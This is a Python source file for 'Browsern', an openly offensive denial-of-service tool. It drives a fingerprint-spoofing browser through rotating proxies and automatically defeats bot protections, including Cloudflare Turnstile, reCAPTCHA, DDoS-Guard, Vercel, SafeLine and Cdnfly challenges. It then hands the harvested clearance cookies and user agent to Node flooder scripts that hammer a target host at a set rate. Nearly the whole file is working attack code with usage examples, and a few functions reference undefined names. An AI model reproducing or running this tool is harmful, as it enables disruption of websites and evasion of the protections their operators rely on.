#!/usr/bin/python3
import asyncio
import sys
import time
import os
import subprocess
import signal
import random
import string
import math

from browserforge.fingerprints import Screen
from camoufox.async_api import AsyncCamoufox
from playwright_recaptcha import recaptchav2

args = sys.argv[1:]

# HELP
if "-h" in args or "--help" in args:
    print("""
Coded by @udpboy (Neerd) | Browsern v2.8.8
Usage: xvfb-run -a python3 browsern.py <host> <duration> <rates> <threads> [options]

Arguments:             Description:
  <host>                Target host (example: https://example.com)
  <duration>            Duration in seconds (recommended: 30)
  <rates>               Requests rate per seconds (recommended: 8)
  <threads>             Number of threads (recommended: 2)

Options:                 Description:
  --ua <mode>             Browser User Agent (linux, windows, macos, RAND, yourfile.txt) [default: windows]
  --headless <mode>       Browser headless mode (True, False, virtual) [default: True]
  --optimize <value>      Optimize browser performance [default: False]
  --referrer <value>      Headers referrer custom (https://example.com/) [default: False]
  --emulation <value>     Simulates human-like browser behavior [default: False]
  --browser <count>       Browser intances per thread (recommended: 8) [default: 1]
  --dratelimit <value>    Enable ratelimit detection [default: False]
  --flooder <value>       Browser flooder [default: True]
  --cache <value>         Enable cache bypass [default: False]
  --http <1/2>            Flooder HTTP Version (only raw) [default: 2]
  --randrate <count>      Randomize rate 2 to 8 [default: False]
  --proxy <file>          Path to proxy list file Format: (ip:port, authentication: ip:port:username:password)
  --debug <value>         Show browser and flooder logs [default: True]
  -h, --help              Show help and usage instructions

Examples:
 xvfb-run -a python3 browsern.py https://captcha.flexystat.dev 300 8 6 --browser 32 --proxy proxy.txt
 xvfb-run -a python3 browsern.py https://captcha.flexystat.dev 600 12 4 --optimize true --ua RAND
"""
    )
    sys.exit(0)

if len(args) < 4:
    print(
        """
Coded by @udpboy (Neerd) | Browsern v2.8.8
Usage: xvfb-run -a python3 browsern.py <host> <duration> <rates> <threads> [options]
       xvfb-run -a python3 browsern.py --help
"""
    )
    sys.exit(1)


def get_arg_value(name):
    if name in args:
        idx = args.index(name)
        if idx + 1 < len(args) and not args[idx + 1].startswith("--"):
            return args[idx + 1]
    return None


def get_arg_flag(name):
    return name in args


def generate_random_string(min_length, max_length):
    characters = string.ascii_letters + string.digits
    length = random.randint(min_length, max_length)
    return "".join(random.choice(characters) for _ in range(length))


def generate_random_rate():
    return random.randint(4, 32)


# Arguments
host = args[0]
duration = int(args[1])
rates = int(args[2])
threads = int(args[3])
validkey = generate_random_string(5, 10)

# Mengambil opsi dengan penanganan yang benar
os_arg = get_arg_value("--ua") or "windows"
headless_arg = get_arg_value("--headless")


def get_bool_arg(name, default=False):
    if name not in args:
        return default

    idx = args.index(name)

    if idx + 1 < len(args) and not args[idx + 1].startswith("--"):
        next_arg = args[idx + 1].lower()
        if next_arg in ["true", "1", "yes", "y"]:
            return True
        elif next_arg in ["false", "0", "no", "n"]:
            return False
        else:
            return True
    else:
        return True


optimize = get_bool_arg("--optimize", default=False)
flooder = get_bool_arg("--flooder", default=True)
dratelimit = get_bool_arg("--dratelimit", default=False)
cache = get_bool_arg("--cache", default=False)
randrate = get_bool_arg("--randrate", default=False)
debug = get_bool_arg("--debug", default=True)
emulation = get_bool_arg("--emulation", default=False)
http = get_arg_value("--http") or "1"
referrer = get_arg_value("--referrer") or False
browsers_str = get_arg_value("--browser")
browsers = int(browsers_str) if browsers_str and browsers_str.isdigit() else 1
proxy_arg = get_arg_value("--proxy")

#print(f"Host: {host}")
#print(f"Duration: {duration}")
#print(f"Rates: {rates}")
#print(f"Threads: {threads}")
#print(f"Optimize: {optimize}")
#print(f"Debug: {debug}")
#print(f"Flooder: {flooder}")
#print(f"Emulation: {emulation}")

valid_os = ["linux", "windows", "macos", "RAND"]
args_browser = [
    "--no-sandbox",
    "--disable-setuid-sandbox",
    "--disable-dev-shm-usage",
    "--disable-infobars",
    "--start-maximized",
    "--disable-extensions",
    "--lang=en-US,en;q=0.9",
    "--window-size=1920,1080",
]

proxy_config = None
geoip = False
us = os_arg

if headless_arg is None:
    headless = True

else:
    if headless_arg == "True":
        headless = True
    elif headless_arg == "False":
        headless = False
    elif headless_arg == "virtual":
        headless = "virtual"
    else:
        print(f"[INFO] Invalid headless mode: {headless_arg}")
        print("[INFO] Valid modes: True, False, virtual")
        sys.exit(1)


if optimize == True:
    args_browser = [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--disable-infobars",
        "--start-maximized",
        "--disable-extensions",
        "--lang=en-US,en;q=0.9",
        "--window-size=1920,1080",
#        "--disable-accelerated-2d-canvas",
        "--no-first-run",
        "--no-zygote",
        #'--disable-gpu',
        "--disable-extensions",
        "--disable-background-networking",
        "--disable-default-apps",
        "--disable-sync",
        "--metrics-recording-only",
        "--mute-audio",
        "--no-default-browser-check",
        "--disable-background-timer-throttling",
        "--disable-backgrounding-occluded-windows",
        "--disable-renderer-backgrounding",
    ]

if us not in valid_os:
    print(f"[INFO] Invalid ua mode: {os}")
    print(f"[INFO] Valid modes: {', '.join(valid_os)}")
    sys.exit(1)

if os_arg == "RAND":
    us = ["windows", "macos", "linux"]

if proxy_arg:
    geoip = True

use_http1 = None
if http == "1":
  use_http1 = True

else:
  use_http1 = False

print(http, use_http1)
def r(a, b):
    return random.uniform(a, b)


async def flood(cookie, ua, proxy_config, proxy):
    parts = proxy.split(":")

    if len(parts) == 4:
        ip, port, user, pwd = parts
        proxy = f"{user}:{pwd}@{ip}:{port}"

    args_p = [
         "screen", "-dm", "node", "floodbrs.js", host, str(duration), str(threads), str(proxy), str(rates),  str(cookie), str(ua), validkey
    ]
    args = [
       "node", "flooder.js", host, str(duration),  str(random.randint(2, 8) if randrate else rates), str(threads), "null", '--proxy', str(proxy), '--getcookie', str(cookie), '--ua', str(ua), '--autoratelimit', 'true',
    ]

    if cache:
      args += ['--cache', 'true']


    process = await asyncio.create_subprocess_exec(
          *args,
          stdout=asyncio.subprocess.PIPE,
          stderr=asyncio.subprocess.PIPE
    )

    while True:
        line = await process.stdout.readline()
        if not line:
            break
        print(line.decode().strip())

async def safeline_captcha(page):
    try:
        element = await page.wait_for_selector("#sl-check", timeout=8000)
        if not element:
            return False

        bounding_box = await element.bounding_box()
        if not bounding_box:
            return False

        coord_x = bounding_box['x']
        coord_y = bounding_box['y']
        width = bounding_box['width']
        height = bounding_box['height']

        checkbox_x = coord_x + width / 2
        checkbox_y = coord_y + height / 2
#        print(f"Clicking at: {checkbox_x}, {checkbox_y}")
        await page.mouse.click(x=checkbox_x, y=checkbox_y)

        return True

    except Exception as e:
        print(f"[ERROR] Failed to solve safeline: {e}")
        return False

async def turnstile(page):
    try:
        for _ in range(15):
            await asyncio.sleep(0.6)

            for frame in page.frames:
                if frame.url.startswith('https://challenges.cloudflare.com'):
                    frame_element = await frame.frame_element()
                    bounding_box = await frame_element.bounding_box()
                    if not bounding_box:
                        continue

                    coord_x = bounding_box['x']
                    coord_y = bounding_box['y']
                    width = bounding_box['width']
                    height = bounding_box['height']

                    checkbox_x = coord_x + width / 9
                    checkbox_y = coord_y + height / 2
#                    print(f"Clicking at: {checkbox_x}, {checkbox_y}")
                    await page.mouse.click(x=checkbox_x, y=checkbox_y)

        return True
    except Exception as e:
        print(f"Error clicking checkbox: {e}")
        return False

async def solve_slider(page, selector):
    try:
        slider = await page.wait_for_selector(selector, timeout=5000)
        if not slider:
            return False

        box = await slider.bounding_box()
        if not box:
            return False

        start_x = box["x"] + 5
        start_y = box["y"] + box["height"] / 2

        # target jangan full mentok (biar natural)
        end_x = box["x"] + box["width"] + random.randint(380, 450)

        await asyncio.sleep(random.uniform(0.5, 1.2))

        # gerakan ke awal
        await page.mouse.move(start_x, start_y)
        await asyncio.sleep(random.uniform(0.1, 0.3))

        await page.mouse.down()

        current_x = start_x
        current_y = start_y

        # drag bertahap (lebih natural)
        while current_x < end_x:
            step = random.randint(5, 15)
            current_x += step

            # gerakan naik turun dikit (biar ga lurus)
            current_y += random.randint(-2, 2)

            await page.mouse.move(current_x, current_y)
            await asyncio.sleep(random.uniform(0.01, 0.03))

        # tahan sebentar sebelum lepas (penting!)
        await asyncio.sleep(2)

        await page.mouse.up()

        # jangan langsung kabur jauh
        await asyncio.sleep(random.uniform(0.2, 0.5))
        await page.mouse.move(current_x - 20, current_y)

        await asyncio.sleep(2)

        return True

    except Exception as e:
#        print("[ERROR] Slider solve failed:", e)
        return False

async def generic_captcha(page):
    captcha_selectors = [
        ".tcaptcha",
        "#tcaptcha_iframe",
        ".tencent-captcha",
        "iframe[src*='tencent']",
        ".incap-challenge",
        ".incapsula",
        "#incap-cookie",
        "iframe[src*='incapsula']",
        "iframe[src*='imperva']",
        ".akamai-bot",
        ".akamai-challenge",
        "iframe[src*='akamai']",
        "#datadome",
        ".datadome-captcha",
        "iframe[src*='datadome']",
        ".px-captcha",
        ".px-challenge",
        "input[name*='captcha' i]",
        "input[id*='captcha' i]",
        "input[class*='captcha' i]",
        "input[placeholder*='captcha' i]",
        "input[aria-label*='captcha' i]",
        ".captcha-btn",
        ".btn-captcha",
        ".verify-btn",
        ".human-check",
        "button[id*='captcha' i]",
        "button[class*='captcha' i]",
        "button:has-text('CAPTCHA')",
        "button:has-text('Verify')",
        "button:has-text('Verification')",
        "button:has-text('Continue')",
        "button:has-text('I am human')",
        "button:has-text('I am not a robot')",
        "button:has-text('Saya bukan robot')",
        "button:has-text('Verifikasi')",
        "button:has-text('验证')",
        "button:has-text('我不是机器人')",
        "button:has-text('私はロボットではありません')",
        "*:has-text('captcha')",
        "*:has-text('robot')",
        "*:has-text('verification')",
        "*:has-text('human')",
        "*:has-text('安全验证')",
        "*:has-text('人机验证')",
        ".captcha",
        "#captcha",
        ".captcha-container",
        ".captcha-wrapper",
        ".captcha-box",
        ".captcha-panel",
        ".captcha-area",
        ".bot-check",
        ".human-verify",
        "[role='dialog'][aria-label*='captcha' i]",
        "[aria-describedby*='captcha' i]",
        "[aria-live*='captcha' i]",
        "[aria-label*='robot' i]",
        "[data-sitekey]",
        "[data-captcha]",
        "[data-verify]",
        "[data-challenge]",
        "[data-human]",
        "[data-bot]",
        "iframe[style*='captcha' i]",
        "div[style*='captcha' i]",
        "div[style*='challenge' i]",
        "[id*='captcha' i]",
        "[class*='captcha' i]",
        "[name*='captcha' i]",
        "[id*='challenge' i]",
        "[class*='challenge' i]",
    ]

    for selector in captcha_selectors:
        try:
            element = await page.query_selector(selector)
            if element and await element.is_visible():
                print(f"[INFO] Found Captcha: {selector}")

                await element.hover()
                await asyncio.sleep(random.uniform(0.1, 0.3))
                await element.click(delay=random.randint(30, 100))
                await asyncio.sleep(random.uniform(1, 3))
                return True

        except Exception as e:
            continue

    return False

async def challenge(page, content, proxy):
    try:
        title = await page.title()
        solved = False
        if title in ["Just a moment...", "Checking your browser...", "安全检查中……"]:
            print(f"[INFO] Detected Protection ~ {proxy} Cloudflare Challenge")
            max_attempts = 3

            if geoip:
                await asyncio.sleep(4)

            for attempt in range(1, max_attempts + 1):
                solve = await turnstile(page)
                if solve:
                    await asyncio.sleep(4)  # Delay

                    cookies = await page.context.cookies()
                    cf_cookie = next(
                        (c for c in cookies if c["name"] == "cf_clearance"), None
                    )

                    if not cf_cookie:
                        solved = False
                        await asyncio.sleep(0.1)

                    else:
                        solved = True
                        print(f"[INFO] {proxy} Cloudflare Challenge: Solved")
                        break

        elif title == "Bot Verification":
            print(f"[INFO] Detection Protectin ~ {proxy} Recaptcha")
            async with recaptchav2.AsyncSolver(page) as solver:
                 token = await solver.solve_recaptcha(wait=True)
                 print(f"[INFO] {proxy} Recaptcha V2 Challenge: Solved (Token): {token}")
            solved = True

        elif title == "Vercel Security Checkpoint":
            print(f"[INFO] Detected Protection ~ {proxy} Vercel Challenge")
            await asyncio.sleep(20)
            title2 = await page.title()
            if title2 != title:
                print(f"[INFO] {proxy} Vercel Challenge: Solved")
                solved = True

        elif title == "DDoS-Guard":
            print(f"[INFO] Detected Protection ~ {proxy} DDoS-Guard Challenge")
            await asyncio.sleep(5)
            title2 = await page.title()
            if title2 != title:
                print(f"[INFO] {proxy} DDoS-Guard Challenge: Solved")
                solved = True

        elif title == "Checking your browser before accessing. Just a moment...":
            print(f"[INFO] Detected Protection ~ {proxy} H-CDN Challenge")
            await asyncio.sleep(5)
            title2 = await page.title()
            if title2 != title:
                print(f"[INFO] {proxy} H-CDN Challenge: Solved")
                solved = True

        elif await page.query_selector("#sl-check"):
            print(f"[INFO] Detected Protection ~ {proxy} SafeLine WAF Captcha")
            safeline = await safeline_captcha(page)
            if safeline:
                print(f"[INFO] {proxy} SafeLine WAF Captcha: Solved")
                solved = True
            else:
                print(f"[INFO] {proxy} SafeLine WAF Captcha: Failed")

        elif "/_guard/html.js" in content or "js=delay_jump_html" in content:
            print(f"[INFO] Detected Protection ~ {proxy} Cdnfly Old Challenge")
            await asyncio.sleep(5)
            content2 = await page.content()
            if "/_guard/html.js" not in content2:
                print(f"[INFO] {proxy} Cdnfly Challenge: Solved")

        elif "_guard/click.js" in content or "js=click_html" in content:
            print(f"[INFO] Detected Protection ~ {proxy} Cdnfly Old Click Challenge")
            element = await page.wait_for_selector("#access", timeout=3000)
            if element and await element.is_visible():
                await element.hover()
                await asyncio.sleep(random.uniform(0.1, 0.3))
                await element.click(delay=random.randint(30, 100))
                await asyncio.sleep(random.uniform(1, 3))
                content2 = await page.content()
                if "_guard/click.js" not in content2:
                  print(f"[INFO] {proxy} Cdnfly Click Challenge: Solved")

        elif await page.query_selector("#sl-slider"):
            print(f"Detected Protection ~ {proxy} SafeLine WAF Slide Challenge")
            slider = await solve_slider(page, "#sl-slider")
            if slider:
              print(f"[INFO] {proxy} SafeLine WAF Captcha: Solved")
              solved = True
            else:
                print(f"[INFO] {proxy} SafeLine WAF Captcha: Failed")

        elif await page.query_selector("#slider"):
            print(f"Detected Protection ~ {proxy} Cdnfly Old Slide Challenge")
            slider = await solve_slider(page, "#slider")
            if slider:
              print(f"[INFO] {proxy} Cdnfly Old Slide Challenge: Solved")
              solved = True
            else:
                print(f"[INFO] {proxy} Cdnfly Old Slide Challenge: Failed")

        elif await page.query_selector("#handler"):
            print(f"Detected Protection ~ {proxy} Goedge Slide Challenge")
            title = await page.title()
            solve = await solve_slider(page, "#handler")
            if solve:
              await asyncio.sleep(1)
              title2 = await page.title()
              if title2 != title:
                print(f"[INFO] {proxy} Goedge Slide Challenge: Solved")
                solved = True

        else:
            gcaptcha = await generic_captcha(page)
            if not gcaptcha:
              print(f"[INFO] {proxy} No Challenge detected")
            await asyncio.sleep(5)
            solved = True

        if solved:
          return True

        else:
             return False

    except Exception as e:
        print(f"[Error] {e}")
        return False

async def browsern(host, proxy_config, proxy):
   page = None
   browser = None
   try:
                browser = await AsyncCamoufox(
                  headless=headless,
                  proxy=proxy_config,
                  geoip=geoip,
                  humanize=emulation,
                  os=us,
                  screen=Screen(max_width=1920, max_height=1080),
                  locale="en-US",
                  args=args_browser,
                ).__aenter__()
                page = await browser.new_page()
                if referrer:
                    await page.set_extra_http_headers(
                        {
                            "Referer": referrer,
                        }
                    )

                br = await page.goto(host, wait_until="domcontentloaded") #, timeout=10000)
                title = await page.title()
                print(
                  f"[INFO] Started Browser ~ {proxy} | Title: ({title}) | Status: {br.status}"
                )
                await asyncio.sleep(0.8)
                content = await page.content()
                bypass = await challenge(page, content, proxy)

                await asyncio.sleep(0.6)
                title2 = await page.title()
                ua = await page.evaluate("() => navigator.userAgent")
                cookie = await page.context.cookies()
                cookie = [
                   c
                   for c in cookie
                   if c["name"]
                   not in [
                       "__cf_bm",
                       "_cfuvid",
                       "cf_chl_2",
                       "cf_chl_seq_",
                       "cf_chl_prog",
                       "cf_chl_rc_",
                       "cf_chl_cc_",
                       "_abck",
                       "bm_sv",
                       "bm_mi",
                       "ak_bmsc",
                       "nonce",
                       "csrf_token",
                       "xsrf-token",
                       "doOver",
                       "OJSSID",
                       "XSRF-TOKEN",
                   ]
                ]  # cookie non-reusable
                cf_value = next(
                    (c["value"] for c in await page.context.cookies() if c["name"] == "cf_clearance"), None
                )
                if cf_value:
                  cookie = f"cf_clearance={cf_value}" if cf_value else ""
                else:
                  cookie = " ".join(f"{c['name']}={c['value']}" for c in cookie)

                print(
                  f"[INFO] Closed browser - {proxy}\n[INFO] Page Title: ({title2}) | Proxy: {proxy} | User Agent: {ua} | Cookie: {cookie}"
                )
                await page.close()
                await browser.close()
                if bypass:
                  if flooder:
                    await flood(cookie, ua, proxy_config, proxy)
                    return True
                  else: pass

#                else:
 #                 await browsern(host, proxy_config, proxy)

   except Exception as err:
        if debug:
          print(f"[Error] {err}")
        else: pass
   finally:
        if page:
            try:
                await page.close()
            except Exception:
                pass
        if browser:
          await browser.close()

        return False


async def browsern_debug(host):
    try:
        async with AsyncCamoufox(
            headless=headless,
            humanize=emulation,
            os=us,
            screen=Screen(max_width=1920, max_height=1080),
            locale="en-US",
            args=args_browser,
        ) as browser:
            page = await browser.new_page()
            br = await page.goto(host, wait_until="domcontentloaded")
            title = await page.title()

            print(f"[INFO] Started Browser | Title: ({title}) | Status: {br.status}")
            await asyncio.sleep(0.6)
            content = await page.content()

            solved = True
            if title in ["Just a moment...", "Checking your browser...", "安全检查中……"]:
                print(f"[INFO] Detected Protection ~ Cloudflare Challenge")
                max_attempts = 3

                for attempt in range(1, max_attempts + 1):
                    solve = await turnstile(page)
                    if solve:
                        await asyncio.sleep(0.8)
                        cookies = await page.context.cookies()
                        cf_cookie = next(
                            (c for c in cookies if c["name"] == "cf_clearance"), None
                        )

                        if not cf_cookie:
                            solved = False
                            await asyncio.sleep(0.1)

                        else:
                            solved = True
                            print(f"[INFO] Cloudflare Challenge: Solved")
                            break

            elif title == "Vercel Security Checkpoint":
                print("[INFO] Detected Protection ~ Vercel Challenge")
                await asyncio.sleep(22)
                title2 = await page.title()
                if title2 != title:
                    print("[INFO] Vercel Challenge: Solved")
                    solved = True

            elif title == "DDoS-Guard":
                print("[INFO] Detected Protection ~ DDoS-Guard Challenge")
                await asyncio.sleep(5)
                title2 = await page.title()
                if title2 != title:
                    print("[INFO] DDoS-Guard Challenge: Solved")
                    solved = True

            elif title == "Checking your browser before accessing. Just a moment...":
                print("[INFO] Detected Protection ~ H-CDN Challenge")
                await asyncio.sleep(5)
                title2 = await page.title()
                if title2 != title:
                    print("[INFO] H-CDN Challenge: Solved")
                    solved = True

            elif await page.query_selector("#sl-check"):
                print("[INFO] Detected Protection ~ SafeLine WAF Challenge")
                safeline = await solve_slider(page, "#sl-slider")
                if safeline:
                    print("[INFO] SafeLine WAF Challenge: Solved")
                    await asyncio.sleep(5)
                    solved = True

                else:
                    print("[INFO] SafeLine WAF Challenge: Failed")

            elif await page.query_selector("#sl-slider"):
                print(f"Detected Protection ~ {proxy} SafeLine WAF Slide Challenge")
                await solve_slider(page, "#sl-slider")
                if slider:
                  print(f"[INFO] {proxy} SafeLine WAF Captcha: Solved")
                  solved = True
                else:
                     print(f"[INFO] {proxy} SafeLine WAF Captcha: Failed")
            else:
                solved = True
                print("[INFO] Waiting 5s for JS challenge...")
                await asyncio.sleep(5)

            await asyncio.sleep(0.5)
            title2 = await page.title()
            ua = await page.evaluate("() => navigator.userAgent")
            cookie = await page.context.cookies()
            cookie = [
                c
                for c in cookie
                if c["name"]
                not in [
                    "__cf_bm",
                    "_cfuvid",
                    "cf_chl_2",
                    "cf_chl_seq_",
                    "cf_chl_prog",
                    "cf_chl_rc_",
                    "cf_chl_cc_",
                    "_abck",
                    "bm_sv",
                    "bm_mi",
                    "ak_bmsc",
                    "nonce",
                    "csrf_token",
                    "xsrf-token",
                    "XSRF-TOKEN",
                    "doOver",
                ]
            ]  # cookie non-reusable
            cookie = " ".join(f"{c['name']}={c['value']}" for c in cookie)
            await page.set_extra_http_headers({"Cookie": cookie})
            print(
                f"[INFO] Closed browser\n[INFO] Page Title: ({title2}) | User Agent: {ua} | Cookie: {cookie}"
            )
            if dratelimit:
              dratelimit_status = await safe_goto(page, host, max_retry=100)
              if dratelimit_status == 429:
                print(f"[INFO] Ratelimit Detect 429")
                await page.close()
                sys.exit()

            await page.close()
            await browser.close()

            if solved:
                if use_http1:
                  args = [
                    "node",
                    "http1.js",
                    host,
                    str(duration),
                    str(random.randint(2, 8) if randrate else rates),
                    str(ua),
                    str(cookie),
                  ]
                else:
                  args = [
                    "node",
                    "http2.js",
                    host,
                    str(duration),
                    str(random.randint(2, 8) if randrate else rates),
                    str(threads),
                    "1",
                    "nle",
                    "--ua",
                    str(ua),
                    "--cookie",
                    str(cookie),
                  ]
                if flooder:
                  print(f"[INFO] Flooder started on {rates} rates for {duration} seconds")
                  result = subprocess.run(args, text=True, timeout=duration)

            else:
                await browsern_debug(host)

    except Exception as err:
        print(f"[Error] {err}")


async def load_proxies(path="proxies.txt"):
    q = asyncio.Queue()
    with open(path, "r") as f:
        for line in f:
            p = line.strip()
            if p:
                await q.put(p)
    return q

async def worker(name, proxy_queue):
    """Ambil proxy satu per satu, proses sampai berhasil atau queue habis."""
    while True:
        try:
            proxy = await proxy_queue.get()
        except asyncio.CancelledError:
            break

        try:
            parts = proxy.split(":")
            if len(parts) == 4:
                ip, port, username, password = parts
                proxy_config = {
                    "server": f"http://{ip}:{port}",
                    "username": username,
                    "password": password,
                }
            elif len(parts) == 2:
                ip, port = parts
                proxy_config = {"server": f"http://{ip}:{port}"}
            else:
                proxy_queue.task_done()
                continue

            success = await browsern(host, proxy_config, proxy)
            if success:
#                print(f"[WORKER {name}] Sukses dengan proxy {proxy}, berhenti.")
                return   # worker selesai, yang lain akan terus berjalan
#            else:
 #               print(f"[WORKER {name}] Gagal dengan proxy {proxy}, coba proxy lain.")

        except Exception as e:
            if debug:
                print(f"[WORKER {name}] Error: {e}")
        finally:
            proxy_queue.task_done()

async def main():
    proxy_queue = await load_proxies(proxy_arg)

    tasks = [
        asyncio.create_task(worker(i + 1, proxy_queue))
        for i in range(int(browsers))
    ]

    try:
        await proxy_queue.join()
    except asyncio.CancelledError:
        pass

    for t in tasks:
        t.cancel()

    await asyncio.gather(*tasks, return_exceptions=True)


def signal_handler(sig, frame):
    print("\nSIGINT Signal Received, Cleaning Up Resources and Terminating Related Processes...")
    os.system("pkill -f camoufox")
    os.system("pkill -f playwright")
    os.system("pkill -f Xvfb")
    os.system("pkill -f flooder")
    os.system("pkill -f http1")
    os.system("pkill -f http2")
    print("All Related Processes Have Been Destroyed")
    print("Resources Cleaned Up, Process Exited")
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGALRM, signal_handler)
signal.alarm(duration+20)

if __name__ == "__main__":
    if debug:
        print("Powered by @udpboy (Browsern  v2.8.8)")
        print(
            f"Browser Arguments [ duration: {duration}, rates: {rates}, threads: {threads}"
        )
        print(
            f"Browser Options [ proxy: {proxy_arg},  headless: {headless}, os: {os_arg}, optimize: {optimize}"
        )

    if proxy_arg:
        asyncio.run(main())

    else:
        asyncio.run(browsern_debug(host))
